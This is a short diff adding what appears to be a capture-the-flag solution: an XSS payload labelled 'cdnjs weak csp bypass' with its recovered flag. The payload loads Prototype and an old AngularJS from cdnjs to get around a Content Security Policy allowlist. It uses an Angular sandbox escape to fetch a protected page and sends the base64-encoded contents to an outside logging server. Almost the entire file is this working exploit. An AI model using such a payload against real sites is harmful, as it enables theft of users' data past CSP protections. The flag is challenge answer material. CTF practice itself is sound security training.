@@ -1,0 +1,9 @@
+input: <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+ <div ng-app ng-csp>
+  {{ x = $on.curry.call().eval("fetch('/alien').then(r => r.arrayBuffer()).then(d => {document.location ='https://server/log?' + btoa(String.fromCharCode.apply(null, new Uint8Array(d)))})") }}
+ </div>
+
+cdnjs weak csp bypass
+
+CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}
